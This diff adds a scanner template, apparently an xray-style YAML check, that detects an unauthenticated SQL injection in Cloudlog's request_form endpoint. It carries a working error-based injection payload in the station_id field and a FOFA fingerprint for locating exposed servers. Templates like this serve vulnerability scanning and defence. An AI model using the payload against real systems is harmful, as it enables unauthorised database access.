@@ -1,0 +1,29 @@
+id: cloudlog-request-form-sqli
+info:
+  name: Cloudlog Request_form SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  description: |
+    Cloudlog system has an unauthenticated SQL injection vulnerability in the request_form interface.
+    Attackers can exploit this vulnerability to extract information from the database.
+    FOFA: icon_hash="-460032467"
+  reference:
+    - https://github.com/wy876/POC/blob/main/Cloudlog/Cloudlog%E7%B3%BB%E7%BB%9Frequest_form%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php/oqrs/request_form
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'Database Error Occurred') &&
+      response.body.bcontains(b'Duplicate entry') &&
+      response.body.bcontains(b'qbqkqlbqkq1') &&
+      response.body.bcontains(b'group_key')
+
+expression: r0()
